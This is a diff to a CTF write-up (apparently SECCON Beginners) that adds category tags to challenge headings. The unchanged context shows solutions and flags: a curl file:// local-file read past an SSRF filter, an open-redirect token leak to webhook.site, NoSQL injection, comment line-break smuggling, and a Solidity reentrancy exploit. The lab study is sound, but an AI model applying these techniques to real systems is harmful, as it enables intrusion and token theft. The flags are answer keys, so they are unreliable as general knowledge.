@@ -4,7 +4,7 @@
 
 Writeups for only problems that I solved. Link to writeups for other problems will be added later.
 
-## assemble (00:32, 82 pt, 161 teams solved)
+## [rev, beginner] assemble (00:32, 82 pt, 161 teams solved)
 
 Challenge 1. Please write `0x123` to RAX!
 
@@ -73,7 +73,7 @@ syscall
 
 The flag is `ctf4b{gre4t_j0b_y0u_h4ve_m4stered_4ssemb1y_14ngu4ge}`.
 
-## cha-ll-enge (00:35, 65 pt, 295 teams solved)
+## [rev, easy] cha-ll-enge (00:35, 65 pt, 295 teams solved)
 
 Opening the file, we see that it is some kind of intermediate level representation. Therefore we... let ChatGPT translate it to C.
 
@@ -127,7 +127,7 @@ int main() {
 
 We see that we can obtain the flag by XOR-ing adjacent elements. The flag is `ctf4b{7ick_7ack_11vm_int3rmed14te_repr3sen7a7i0n}`.
 
-## getRank (00:41, 59 pt, 368 teams solved)
+## [misc, easy] getRank (00:41, 59 pt, 368 teams solved)
 
 ```typescript
 const RANKING = [10 ** 255, 1000, 100, 10, 1, 0];
@@ -181,7 +181,7 @@ function chall(input: string): Res {
 
 We need to get rank 1 here, but our score is divided by $10^{100}$. Since the largest possible value a JavaScript `Number` can have is $~1.7 \times 10^{308}$, we must somehow make our score `Infinity`. We can't do that in base 10 ($10^{299} < \text{Infinity}$), so we try to do that in base 16 (`parseInt('0xF') == 15`). The flag is `ctf4b{15_my_5c0r3_700000_b1g?}`.
 
-## clamre (00:54, 76 pt, 198 teams solved)
+## [misc, easy] clamre (00:54, 76 pt, 198 teams solved)
 
 In `flag.ldb` we see the regex `/^((\x63\x74\x66)(4)(\x62)(\{B)(\x72)(\x33)\3(\x6b1)(\x6e\x67)(\x5f)\3(\x6c)\11\10(\x54\x68)\7\10(\x480)(\x75)(5)\7\10(\x52)\14\11\7(5)\})$/` which is probably the regex for the flag, so we let ChatGPT solve it.
 
@@ -193,7 +193,7 @@ Well unfortunately that is not the correct flag. So we use Debuggex and try the 
 
 The flag is `ctf4b{Br34k1ng_4ll_Th3_H0u53_Rul35}`.
 
-## construct (01:36, 114 pt, 74 teams solved)
+## [rev, medium] construct (01:36, 114 pt, 74 teams solved)
 
 We try to run the binary using `gdb` (with [GEF](https://github.com/hugsy/gef)) but the execution ends before `entry-break`. We open the binary in Ghidra, and see that there is not much in `main`. What...?
 
@@ -235,7 +235,7 @@ print("")
 
 The flag is `ctf4b{c0ns7ruc70rs_3as3_h1d1ng_7h1ngs!}`.
 
-## former-seccomp (01:47, 147 pt, 42 teams solved)
+## [rev, hard] former-seccomp (01:47, 147 pt, 42 teams solved)
 
 We open the binary in Ghidra and see that the program forks into 2 threads. Thread 0 reads the password, while thread 1 processes the password.
 
@@ -269,7 +269,7 @@ So we enter a flag of the format `ctf4b{%26s%[}]` and set a breakpoint at `0x555
 
 The flag is `ctf4b{p7r4c3_c4n_3mul4t3_sysc4ll}`.
 
-## double-leaks (02:25, 130 pt, 55 teams solved)
+## [web, medium] double-leaks (02:25, 130 pt, 55 teams solved)
 
 We see that the payload we send to the server is directly passed to MongoDB.
 
@@ -394,7 +394,7 @@ while True:
         break
 ```
 
-## ssrforlfi (03:08, 113 pt, 76 teams solved)
+## [web, easy] ssrforlfi (03:08, 113 pt, 76 teams solved)
 
 ```py
 # SSRF & LFI protection
@@ -424,7 +424,7 @@ There is not much we can do even with `http://localhost`, even though we can use
 
 So we try the LFI path. Searching `curl file url handling` on Google we find the [URL syntax](https://curl.se/docs/url-syntax.html) page. We see the section
 
-> ## FILE
+> **FILE**
 > When a FILE:// URL is accessed on Windows systems, it can be crafted in a way so that Windows attempts to connect to a (remote) machine when curl wants to read or write such a path.
 > 
 > curl only allows the hostname part of a FILE URL to be one out of these three alternatives: localhost, 127.0.0.1 or blank ("", zero characters). Anything else makes curl fail to parse the URL.
@@ -437,13 +437,13 @@ $ curl 'https://ssrforlfi.beginners.seccon.games/?url=file://localhost/proc/self
 
 And so we have the flag `ctf4b{1_7h1nk_bl0ck3d_b07h_55rf_4nd_lf1}`.
 
-## wooorker (03:11, 78 pt, 186 teams solved)
+## [web, beginner] wooorker (03:11, 78 pt, 186 teams solved)
 
 The report page sends the admin to the login page, which then redirects to `$next/?token=$token`. So we set the login URL to `login?next=https://webhook.site/<REDACTED>` and so we get the flag.
 
 The flag is `ctf4b{0p3n_r3d1r3c7_m4k35_70k3n_l34k3d}`.
 
-## wooorker2 (03:18, 98 pt, 106 teams solved)
+## [web, medium] wooorker2 (03:18, 98 pt, 106 teams solved)
 
 The report page sends the admin to the login page, which then redirects to `$next/#token=$token`. So we set the login URL to `login?next=http://ourcustompage`, which rewrites the URL.
 
@@ -455,7 +455,7 @@ The report page sends the admin to the login page, which then redirects to `$nex
 
 The flag is `ctf4b{0p3n_r3d1r3c7_m4k35_70k3n_l34k3d}`.
 
-## commentator (05:09, 114 pt, 75 teams solved)
+## [misc, easy] commentator (05:09, 114 pt, 75 teams solved)
 
 Since we can only write comment, we must find a way to smuggle a line break into the script file.
 
@@ -470,7 +470,7 @@ __EOF__
 
 The flag is `ctf4b{c4r3l355_c0mm3n75_c4n_16n173_0nl1n3_0u7r463}`.
 
-## vote4b (08:22, 341 pt, 6 teams solved)
+## [misc, easy] vote4b (08:22, 341 pt, 6 teams solved)
 
 This is a classical reentrancy attack problem. We read the [source code of `_safeMint`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L295-L316), and see that it calls `ERC721Utils.checkOnERC721Received`, which calls the `onERC721Received` on `msg.sender`.
 
@@ -546,7 +546,7 @@ contract Cracker is IERC721Receiver {
 }
 ```
 
-## flagAlias (08:25, 174 pt, 29 teams solved)
+## [web, medium] flagAlias (08:25, 174 pt, 29 teams solved)
 
 We use the payload
 
@@ -564,7 +564,7 @@ to call the function.
 
 The flag `ctf4b{y0u_c4n_r34d_4n0th3r_c0d3_in_d3n0}`.
 
-## htmls (09:43, 290 pt, 9 teams solved)
+## [web, hard] htmls (09:43, 290 pt, 9 teams solved)
 
 If we show `<object data="$URL1"><object data="$URL2"></object></object>` in browser, the request to `$URL2` will only be sent when the request to `$URL1` fails. Since the directory containing `flag.txt` consists of only single-character directories, we can brute force the character one-by-one.
 
